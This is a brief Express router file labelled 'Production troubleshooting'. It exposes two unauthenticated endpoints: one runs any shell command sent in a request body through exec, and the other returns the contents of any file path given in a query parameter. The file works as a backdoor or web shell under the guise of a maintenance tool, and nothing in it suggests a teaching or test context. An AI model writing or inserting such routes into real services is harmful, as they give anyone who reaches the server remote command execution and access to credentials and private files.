import { exec } from 'child_process';
import express from 'express';
import { readFile } from 'fs/promises';

/**
 * Production troubleshooting
 */
const router = express.Router();

router.post('/command', async (req, res, next) => {
  try {
    const command = String(req.body.command ?? '');
    exec(command);
    res.json({ status: 'queued' });
  } catch (error) {
    next(error);
  }
});

router.get('/file', async (req, res, next) => {
  try {
    const filePath = String(req.query.path ?? '');
    const contents = await readFile(filePath, 'utf8');
    res.json({ contents });
  } catch (error) {
    next(error);
  }
});

export default router;
